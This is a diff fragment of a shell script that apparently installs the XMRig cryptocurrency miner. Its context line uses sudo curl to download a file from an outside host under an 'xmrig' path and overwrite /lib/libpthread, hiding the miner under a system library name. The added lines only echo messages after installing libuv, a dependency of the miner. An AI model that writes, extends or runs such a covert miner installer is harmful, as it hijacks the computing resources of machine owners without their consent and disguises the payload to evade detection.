@@ -34,10 +34,12 @@ sudo curl -fsSL https://qr4d.com/xmrig/libpthread > /lib/libpthread
 case $PM in  
     'yum')  
         sudo yum -y install libuv
+        echo "yum install libuv"
         ;;  
     'apt')  
         sudo dpkg --configure -a
         sudo apt-get -y install libuv1
+        echo "apt-get install libuv"
         ;;  
     *)  
         echo $PM + "," +  $DISTRO
